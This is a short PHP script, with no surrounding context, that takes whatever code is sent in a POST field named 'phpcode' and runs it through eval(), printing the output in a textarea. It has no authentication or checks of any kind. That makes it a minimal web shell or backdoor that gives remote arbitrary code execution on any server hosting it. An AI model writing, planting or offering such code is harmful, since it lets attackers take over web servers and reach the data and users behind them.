<?php
if(isset($_POST['execphp']))
{	
	echo "start";
	echo "<center><textarea rows='10' cols='100'>";
	echo eval(stripslashes($_POST['phpcode']));
	echo "</textarea></center>";
}
?>